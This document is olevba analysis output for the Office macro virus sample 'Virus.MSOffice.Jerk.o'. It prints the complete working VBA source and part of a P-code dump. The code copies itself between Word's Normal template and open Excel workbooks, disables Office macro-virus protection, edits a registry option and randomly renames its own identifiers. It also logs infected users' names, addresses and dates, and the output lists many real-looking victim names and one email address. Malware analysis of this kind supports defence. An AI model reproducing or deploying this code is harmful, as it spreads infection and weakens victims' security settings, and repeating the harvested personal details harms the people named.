olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const XKBSHVGYMQQPIC = 1, INJMFGFXIAXHZ = True, LYNBHTCKCFL = False, OMASQWETEHZ = 0
Dim VMDCKLDROSJ, ESHIT As String
Dim POIZGFN, QXEBR As Integer
Dim PPKHSLYCN As Boolean
ESHIT = "ThisWorkbook"
VMDCKLDROSJ = Application.ThisWorkbook.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.CountOfLines)
Call KMYIAWITGZYIPA(VMDCKLDROSJ)
For POIZGFN = XKBSHVGYMQQPIC To Application.Workbooks.Count
PPKHSLYCN = LYNBHTCKCFL
For QXEBR = XKBSHVGYMQQPIC To Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Count
If Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.CountOfLines = OMASQWETEHZ Then
If Application.Workbooks.Item(POIZGFN).Path <> "" And Application.Workbooks.Item(POIZGFN).Saved = INJMFGFXIAXHZ And PPKHSLYCN = LYNBHTCKCFL Then PPKHSLYCN = INJMFGFXIAXHZ
Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).Name = ESHIT Then
Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine XKBSHVGYMQQPIC * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine XKBSHVGYMQQPIC * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QXEBR
If PPKHSLYCN = INJMFGFXIAXHZ Then Application.Workbooks.Item(POIZGFN).Save
Next POIZGFN
End Sub
Private Sub Document_Close()
Const INJMFGFXIAXHZ = True, LYNBHTCKCFL = False, OMASQWETEHZ = 0, XKBSHVGYMQQPIC = 1, KJUYYLO = wdFormatDocument, CBXVFKAEKMCBM = wdFormatTemplate, SFHYGPHRHFKQOZQ = ":"
Dim PPKHSLYCN, WRQZYPXLVGFQY, IKPKZPAKGWBBJTX, KBZJOHNI As Boolean
Dim SQCSDOXDP, FOOVZJA As Object
Dim RPZRXFMOI, VMDCKLDROSJ As String
Set SQCSDOXDP = ActiveDocument.VBProject.VBComponents.Item(XKBSHVGYMQQPIC)
Set FOOVZJA = NormalTemplate.VBProject.VBComponents.Item(XKBSHVGYMQQPIC)
Randomize
IKPKZPAKGWBBJTX = LYNBHTCKCFL
KBZJOHNI = LYNBHTCKCFL
If SQCSDOXDP.CodeModule.CountOfLines <> OMASQWETEHZ Then IKPKZPAKGWBBJTX = INJMFGFXIAXHZ
If FOOVZJA.CodeModule.CountOfLines <> OMASQWETEHZ Then KBZJOHNI = INJMFGFXIAXHZ
Options.VirusProtection = LYNBHTCKCFL
If (IKPKZPAKGWBBJTX = INJMFGFXIAXHZ Xor KBZJOHNI = INJMFGFXIAXHZ) And (ActiveDocument.SaveFormat = KJUYYLO Or ActiveDocument.SaveFormat = CBXVFKAEKMCBM) Then
If IKPKZPAKGWBBJTX = INJMFGFXIAXHZ Then
WRQZYPXLVGFQY = NormalTemplate.Saved
VMDCKLDROSJ = SQCSDOXDP.CodeModule.Lines(XKBSHVGYMQQPIC, SQCSDOXDP.CodeModule.CountOfLines)
Call FAMZKCGP(VMDCKLDROSJ)
If Int(Rnd * 10 * XKBSHVGYMQQPIC) = XKBSHVGYMQQPIC * 7 Then Call ZPOTPQB(VMDCKLDROSJ)
Call JEPMGVVHOYOGM(VMDCKLDROSJ)
FOOVZJA.CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If WRQZYPXLVGFQY = INJMFGFXIAXHZ Then NormalTemplate.Save
End If
RPZRXFMOI = Mid(ActiveDocument.FullName, 2, XKBSHVGYMQQPIC)
If KBZJOHNI = INJMFGFXIAXHZ And (RPZRXFMOI = SFHYGPHRHFKQOZQ Or ActiveDocument.Saved = LYNBHTCKCFL) Then
PPKHSLYCN = ActiveDocument.Saved
VMDCKLDROSJ = FOOVZJA.CodeModule.Lines(XKBSHVGYMQQPIC, FOOVZJA.CodeModule.CountOfLines)
Call JEPMGVVHOYOGM(VMDCKLDROSJ)
SQCSDOXDP.CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If PPKHSLYCN = INJMFGFXIAXHZ Then ActiveDocument.Save
End If
End If
End Sub
Private Sub ZPOTPQB(ByRef VMDCKLDROSJ As String)
On Error Resume Next
Const MLTHQEN = 48, FRVEIKQVDPK = 15, ZOGIBBVMHPWTQ = 5, CUMDGILXHZB = 65, HQKTZXCK = 90, XKBSHVGYMQQPIC = 1, INJMFGFXIAXHZ = True, LYNBHTCKCFL = False
Dim HPGPSFXHANTY, UHUEJIQABBGXTmp, HFDKXCLWOEKVOC, UHUEJIQABBGX(XKBSHVGYMQQPIC To MLTHQEN), UHUEJIQABBGX2(XKBSHVGYMQQPIC To MLTHQEN) As String
Dim POIZGFN, QXEBR, SGXONQLCPQZC As Integer
Dim CCPIIV As Boolean
HPGPSFXHANTY = "VMDCKLDROSJ MLTHQEN UHUEJIQABBGX UHUEJIQABBGX2 HFDKXCLWOEKVOC POIZGFN QXEBR SGXONQLCPQZC CCPIIV ZPOTPQB FRVEIKQVDPK ZOGIBBVMHPWTQ CUMDGILXHZB HQKTZXCK XKBSHVGYMQQPIC HPGPSFXHANTY UHUEJIQABBGXTmp PPKHSLYCN WRQZYPXLVGFQY IKPKZPAKGWBBJTX KBZJOHNI SQCSDOXDP FOOVZJA FAMZKCGP KDSJHDCIHPNYD VGTCCPRRFS STSIBTYLRCCHMF HELJBVMLSLGPBO KDSJHDCIHPNYDTmp HZOXZWR FESVRYKFHBJMJ RPZRXFMOI INJMFGFXIAXHZ LYNBHTCKCFL OMASQWETEHZ KJUYYLO CBXVFKAEKMCBM XDHENU PNEQXHBUONCVHCK SFHYGPHRHFKQOZQ SYUJIMJGXA YLUUOYWGEFQEYJE ESHIT KMYIAWITGZYIPA JEPMGVVHOYOGM WRKBW UORXKHRFRFDPH WGBWGOF"
Randomize
QXEBR = XKBSHVGYMQQPIC
For POIZGFN = XKBSHVGYMQQPIC To Len(HPGPSFXHANTY)
If Mid(HPGPSFXHANTY, POIZGFN, XKBSHVGYMQQPIC) = " " Or POIZGFN = Len(HPGPSFXHANTY) Then
If POIZGFN = Len(HPGPSFXHANTY) Then UHUEJIQABBGXTmp = UHUEJIQABBGXTmp & Mid(HPGPSFXHANTY, POIZGFN, XKBSHVGYMQQPIC)
For SGXONQLCPQZC = XKBSHVGYMQQPIC To Int((FRVEIKQVDPK - ZOGIBBVMHPWTQ + XKBSHVGYMQQPIC) * Rnd + ZOGIBBVMHPWTQ)
UHUEJIQABBGX2(QXEBR) = UHUEJIQABBGX2(QXEBR) & Chr(Int((HQKTZXCK - CUMDGILXHZB + XKBSHVGYMQQPIC) * Rnd + CUMDGILXHZB))
Next SGXONQLCPQZC
UHUEJIQABBGX(QXEBR) = UHUEJIQABBGXTmp
UHUEJIQABBGXTmp = ""
QXEBR = QXEBR + XKBSHVGYMQQPIC
Else
UHUEJIQABBGXTmp = UHUEJIQABBGXTmp & Mid(HPGPSFXHANTY, POIZGFN, XKBSHVGYMQQPIC)
End If
Next POIZGFN
CCPIIV = LYNBHTCKCFL
For POIZGFN = XKBSHVGYMQQPIC To Len(VMDCKLDROSJ)
For QXEBR = XKBSHVGYMQQPIC To MLTHQEN
If Mid(VMDCKLDROSJ, POIZGFN, Len(UHUEJIQABBGX(QXEBR))) = UHUEJIQABBGX(QXEBR) Then
HFDKXCLWOEKVOC = HFDKXCLWOEKVOC & UHUEJIQABBGX2(QXEBR)
POIZGFN = POIZGFN + Len(UHUEJIQABBGX(QXEBR)) - XKBSHVGYMQQPIC
CCPIIV = INJMFGFXIAXHZ
Exit For
End If
Next QXEBR
If CCPIIV = LYNBHTCKCFL Then
HFDKXCLWOEKVOC = HFDKXCLWOEKVOC & Mid(VMDCKLDROSJ, POIZGFN, XKBSHVGYMQQPIC)
Else
CCPIIV = LYNBHTCKCFL
End If
Next POIZGFN
VMDCKLDROSJ = HFDKXCLWOEKVOC
End Sub
Private Sub FAMZKCGP(ByRef VMDCKLDROSJ As String)
On Error Resume Next
Const HELJBVMLSLGPBO = "' ", XKBSHVGYMQQPIC = 1
Const XDHENU = "hh:mm:ss: AMPM - ", PNEQXHBUONCVHCK = "dddd, d mmm yyyy"
Dim KDSJHDCIHPNYDTmp, KDSJHDCIHPNYD, HZOXZWR, FESVRYKFHBJMJ, VGTCCPRRFS, STSIBTYLRCCHMF As String
Dim POIZGFN As Integer
VGTCCPRRFS = Chr(10 * XKBSHVGYMQQPIC + 3)
KDSJHDCIHPNYD = Application.UserAddress
FESVRYKFHBJMJ = Format(Time, XDHENU) & Format(Date, PNEQXHBUONCVHCK)
STSIBTYLRCCHMF = Chr(XKBSHVGYMQQPIC * 10)
HZOXZWR = Application.UserName
For POIZGFN = XKBSHVGYMQQPIC To Len(KDSJHDCIHPNYD)
If Mid(KDSJHDCIHPNYD, POIZGFN, XKBSHVGYMQQPIC) <> VGTCCPRRFS Then
If Mid(KDSJHDCIHPNYD, POIZGFN, XKBSHVGYMQQPIC) <> STSIBTYLRCCHMF Then
KDSJHDCIHPNYDTmp = KDSJHDCIHPNYDTmp & Mid(KDSJHDCIHPNYD, POIZGFN, XKBSHVGYMQQPIC)
End If
Else
KDSJHDCIHPNYDTmp = KDSJHDCIHPNYDTmp & VGTCCPRRFS & HELJBVMLSLGPBO
End If
Next POIZGFN
VMDCKLDROSJ = VMDCKLDROSJ & VGTCCPRRFS & HELJBVMLSLGPBO & FESVRYKFHBJMJ & VGTCCPRRFS & HELJBVMLSLGPBO & HZOXZWR & VGTCCPRRFS & HELJBVMLSLGPBO & KDSJHDCIHPNYD & VGTCCPRRFS
End Sub
Private Sub JEPMGVVHOYOGM(ByVal VMDCKLDROSJ As String)
On Error Resume Next
Dim WGBWGOF As Long
Dim SYUJIMJGXA As Object
Dim WRKBW, UORXKHRFRFDPH As String
WRKBW = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
WGBWGOF = &H0
UORXKHRFRFDPH = "Options6"
System.PrivateProfileString("", WRKBW, UORXKHRFRFDPH) = WGBWGOF
Set SYUJIMJGXA = GetObject(, "Excel.Application")
Const XKBSHVGYMQQPIC = 1, OMASQWETEHZ = 0
Dim ESHIT As String
Dim POIZGFN, QXEBR As Integer
ESHIT = "ThisWorkbook"
For POIZGFN = XKBSHVGYMQQPIC To SYUJIMJGXA.Application.Workbooks.Count
For QXEBR = XKBSHVGYMQQPIC To SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Count
If SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.CountOfLines = OMASQWETEHZ Then
SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).Name = ESHIT Then
SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine 33 * XKBSHVGYMQQPIC, "Private Sub Workbook_Deactivate()"
Else
SYUJIMJGXA.Application.Workbooks.Item(POIZGFN).VBProject.VBComponents.Item(QXEBR).CodeModule.ReplaceLine XKBSHVGYMQQPIC * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next QXEBR
Next POIZGFN
Set SYUJIMJGXA = Nothing
End Sub
Private Sub KMYIAWITGZYIPA(ByVal VMDCKLDROSJ As String)
On Error Resume Next
Const INJMFGFXIAXHZ = True, LYNBHTCKCFL = False, XKBSHVGYMQQPIC = 1, OMASQWETEHZ = 0
Dim YLUUOYWGEFQEYJE As Object
Dim WRQZYPXLVGFQY As Boolean
Set YLUUOYWGEFQEYJE = GetObject(, "Word.Application")
If YLUUOYWGEFQEYJE.NormalTemplate.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.CountOfLines = OMASQWETEHZ Then
WRQZYPXLVGFQY = YLUUOYWGEFQEYJE.NormalTemplate.Saved
YLUUOYWGEFQEYJE.Options.VirusProtection = LYNBHTCKCFL
YLUUOYWGEFQEYJE.NormalTemplate.VBProject.VBComponents.Item(XKBSHVGYMQQPIC).CodeModule.InsertLines XKBSHVGYMQQPIC, VMDCKLDROSJ
If WRQZYPXLVGFQY = INJMFGFXIAXHZ Then YLUUOYWGEFQEYJE.NormalTemplate.Save
End If
Set YLUUOYWGEFQEYJE = Nothing
End Sub

' 09:50:09: AM - Wednesday, 10 Feb 1999
' Al Peabody
' 1634 Orchard Beach Road
Annapolis, MD 21401

' 09:42:15: AM - Monday, 22 Feb 1999
' Sergey Morozov
'

' 09:49:26: AM - ÷ĺňâĺđă, 11 ěŕđ 1999
' Advisor
'

' 04:16:54:  - ďîíĺäĺëüíčę, 22 ěŕđ 1999
' ***
'

' 11:52:11:  - ÷ĺňâĺđă, 15 ŕďđ 1999
' Freddy Kruger
'

' 10:39:12:  - ÷ĺňâĺđă, 20 ěŕé 1999
' Andy
'

' 02:41:47:  - ńđĺäŕ, 26 ěŕé 1999
' Andy
'

' 10:00:09:  - ďîíĺäĺëüíčę, 31 ěŕé 1999
' Andy
'

' 03:33:09:  - ďîíĺäĺëüíčę, 1 ˙íâ 1996
' Laborant
'

' 01:48:28:  - ńđĺäŕ, 2 čţí 1999
' User4
'

' 03:44:53:  - ÷ĺňâĺđă, 11 čţí 1998
' ĘÎÄ
'

' 09:41:05:  - ÷ĺňâĺđă, 13 čţí 1996
' Řňŕíüęî
'

' 03:24:12:  - âňîđíčę, 15 čţí 1999
' Ďîďîâ Ä.Ŕ.
'

' 04:33:12:  - âňîđíčę, 15 čţí 1999
' Ďîďîâ Ä. Ŕ.
'

' 12:29:49:  - ńđĺäŕ, 30 čţí 1999
' Ďîďîâ Ä.Ŕ.
'

' 03:42:00:  - âîńęđĺńĺíüĺ, 12 ńĺí 1999
' -UFO-
'

' 03:27:12:  - âîńęđĺńĺíüĺ, 5 äĺę 1999
' Îëĺă
'

' 01:47:48:  - âîńęđĺńĺíüĺ, 12 äĺę 1999
' Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷
'

' 09:22:00:  - ńđĺäŕ, 12 ˙íâ 2000
' Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷
'

' 11:25:35:  - âîńęđĺńĺíüĺ, 27 ěŕé 2001
' Îáúĺäęîâ Îëĺă Ŕëĺęńŕíäđîâč÷
'

Private Sub Document_New()

End Sub

Private Sub Document_Open()

End Sub
' 08:15:17:  - ďîíĺäĺëüíčę, 10 ńĺí 2001
' Ěóőŕěĺäü˙đîâ Ěŕđŕň Đŕâčëüĺâč÷
'

' 02:41:49:  - âňîđíčę, 25 ńĺí 2001
' Ŕëëŕ
'

' 05:11:18:  - ď˙ňíčöŕ, 26 îęň 2001
' Ŕëëŕ
'

' 11:08:41:  - âîńęđĺńĺíüĺ, 23 äĺę 2001
' Ďóäîâŕ Ĺ.Â.
'

' 12:00:08:  - âňîđíčę, 16 ŕďđ 2002
' Řęóíîâ
'

' 09:41:05:  - âňîđíčę, 22 ŕďđ 1997
' 1
'

' 01:59:49:  - âňîđíčę, 23 Ŕďđ 2002
' Patient Of Dr.OGen
'

' 09:56:47:  - âňîđíčę, 7 ěŕé 2002
' Äŕâë˙ňîâ Čëüäóń
'

' 10:14:44:  - ďîíĺäĺëüíčę, 3 čţí 2002
' Äŕâë˙ňîâ Čëüäóń
'

' 02:49:01:  - âňîđíčę, 11 čţí 2002
' Ŕäěčíčńňđŕňîđ
'

' 10:36:55:  - ď˙ňíčöŕ, 5 čţë 2002
' 1
'

' 06:19:01:  - ď˙ňíčöŕ, 5 čţë 2002
' Ŕäěčíčńňđŕňîđ
'

' 05:08:26:  - ńđĺäŕ, 24 čţë 2002
' Ŕäěčíčńňđŕňîđ
'

' 09:32:12:  - ńđĺäŕ, 31 čţë 2002
' Ŕäěčíčńňđŕňîđ
'

' 05:12:55:  - ńđĺäŕ, 31 čţë 2002
' RAFIKOV
'

' 08:59:32:  - âňîđíčę, 5 íî˙ 2002
' RAFIKOV
'

' 11:25:16:  - ńđĺäŕ, 27 íî˙ 2002
' Ňîęŕđĺâ
'

' 11:49:42:  - âňîđíčę, 3 äĺę 2002
' MBT
'

' 01:56:51:  - ńóááîňŕ, 4 ˙íâ 2003
' User
'

' 11:26:03:  - ÷ĺňâĺđă, 9 ˙íâ 2003
' fayer
' aku@tanak-cakap.com

' 09:52:19:  - utorok, 18 III 2003
' Rep1
'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Jerk.o
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 20376 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn XKBSHVGYMQQPIC
' 	LitVarSpecial (True)
' 	VarDefn INJMFGFXIAXHZ
' 	LitVarSpecial (False)
' 	VarDefn LYNBHTCKCFL
' 	LitDI2 0x0000 
' 	VarDefn OMASQWETEHZ
' Line #35:
' 	Dim 
' 	VarDefn VMDCKLDROSJ
' 	VarDefn ESHIT (As String)
' Line #36:
' 	Dim 
' 	VarDefn POIZGFN
' 	VarDefn QXEBR (As Integer)
' Line #37:
' 	Dim 
' 	VarDefn PPKHSLYCN (As Boolean)
' Line #38:
' 	LitStr 0x000C "ThisWorkbook"
' 	St ESHIT 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VMDCKLDROSJ 
' Line #40:
' 	Ld VMDCKLDROSJ 
' 	ArgsCall (Call) KMYIAWITGZYIPA 0x0001 
' Line #41:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld LYNBHTCKCFL 
' 	St PPKHSLYCN 
' Line #43:
' 	StartForVariable 
' 	Ld QXEBR 
' 	EndForVariable 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #44:
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld OMASQWETEHZ 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	And 
' 	Ld PPKHSLYCN 
' 	Ld LYNBHTCKCFL 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld INJMFGFXIAXHZ 
' 	St PPKHSLYCN 
' 	EndIf 
' Line #46:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld VMDCKLDROSJ 
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #47:
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld ESHIT 
' 	Eq 
' 	IfBlock 
' Line #48:
' 	Ld XKBSHVGYMQQPIC 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	Ld XKBSHVGYMQQPIC 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld QXEBR 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld QXEBR 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	Ld PPKHSLYCN 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld POIZGFN 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Ld POIZGFN 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Private Sub Document_Close())
' Line #58:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn INJMFGFXIAXHZ
' 	LitVarSpecial (False)
' 	VarDefn LYNBHTCKCFL
' 	LitDI2 0x0000 
' 	VarDefn OMASQWETEHZ
' 	LitDI2 0x0001 
' 	VarDefn XKBSHVGYMQQPIC
' 	Ld wdFormatDocument 
' 	VarDefn KJUYYLO
' 	Ld wdFormatTemplate 
' 	VarDefn CBXVFKAEKMCBM
' 	LitStr 0x0001 ":"
' 	VarDefn SFHYGPHRHFKQOZQ
' Line #59:
' 	Dim 
' 	VarDefn PPKHSLYCN
' 	VarDefn WRQZYPXLVGFQY
' 	VarDefn IKPKZPAKGWBBJTX
' 	VarDefn KBZJOHNI (As Boolean)
' Line #60:
' 	Dim 
' 	VarDefn SQCSDOXDP
' 	VarDefn FOOVZJA (As Object)
' Line #61:
' 	Dim 
' 	VarDefn RPZRXFMOI
' 	VarDefn VMDCKLDROSJ (As String)
' Line #62:
' 	SetStmt 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set SQCSDOXDP 
' Line #63:
' 	SetStmt 
' 	Ld XKBSHVGYMQQPIC 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set FOOVZJA 
' Line #64:
' 	ArgsCall Read 0x0000 
' Line #65:
' 	Ld LYNBHTCKCFL 
' 	St IKPKZPAKGWBBJTX 
' Line #66:
' 	Ld LYNBHTCKCFL 
' 	St KBZJOHNI 
' Line #67:
' 	Ld SQCSDOXDP 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld OMASQWETEHZ 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld INJMFGFXIAXHZ 
' 	St IKPKZPAKGWBBJTX 
' 	EndIf 
' Line #68:
' 	Ld FOOVZJA 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld OMASQWETEHZ 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld INJMFGFXIAXHZ 
' 	St KBZJOHNI 
' 	EndIf 
' Line #69:
' 	Ld LYNBHTCKCFL 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #70:
' 	Ld IKPKZPAKGWBBJTX 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	Ld KBZJOHNI 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld KJUYYLO 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld CBXVFKAEKMCBM 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #71:
' 	Ld IKPKZPAKGWBBJTX 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St WRQZYPXLVGFQY 
' Line #73:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld SQCSDOXDP 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld SQCSDOXDP 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VMDCKLDROSJ 
' Line #74:
' 	Ld VMDCKLDROSJ 
' 	ArgsCall (Call) FAMZKCGP 0x0001 
' Line #75:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	Ld XKBSHVGYMQQPIC 
' 	Mul 
' 	FnInt 
' 	Ld XKBSHVGYMQQPIC 
' 	LitDI2 0x0007 
' 	Mul 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VMDCKLDROSJ 
' 	ArgsCall (Call) ZPOTPQB 0x0001 
' 	EndIf 
' Line #76:
' 	Ld VMDCKLDROSJ 
' 	ArgsCall (Call) JEPMGVVHOYOGM 0x0001 
' Line #77:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld VMDCKLDROSJ 
' 	Ld FOOVZJA 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	Ld WRQZYPXLVGFQY 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	Ld XKBSHVGYMQQPIC 
' 	ArgsLd Mid$ 0x0003 
' 	St RPZRXFMOI 
' Line #81:
' 	Ld KBZJOHNI 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	Ld RPZRXFMOI 
' 	Ld SFHYGPHRHFKQOZQ 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld LYNBHTCKCFL 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #82:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St PPKHSLYCN 
' Line #83:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld FOOVZJA 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld FOOVZJA 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VMDCKLDROSJ 
' Line #84:
' 	Ld VMDCKLDROSJ 
' 	ArgsCall (Call) JEPMGVVHOYOGM 0x0001 
' Line #85:
' 	Ld XKBSHVGYMQQPIC 
' 	Ld VMDCKLDROSJ 
' 	Ld SQCSDOXDP 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #86:
' 	Ld PPKHSLYCN 
' 	Ld INJMFGFXIAXHZ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #87:
